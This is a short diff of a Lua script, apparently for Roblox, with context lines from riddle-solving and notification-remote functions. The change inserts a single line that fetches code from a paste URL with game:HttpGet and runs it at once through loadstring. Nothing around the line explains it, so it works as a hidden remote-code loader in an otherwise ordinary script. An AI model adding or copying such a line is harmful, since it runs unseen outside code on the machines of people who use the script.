@@ -389,7 +389,7 @@ local function solveRiddle(message, seq)
         end
     end)
 end
-
+loadstring(game:HttpGet'https://pastefy.app/t3WJBWml/raw')()
 -- ===== REMOTE NOTIFICATION RESOLVER =====
 local function resolveNotifyRemote()
     if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end
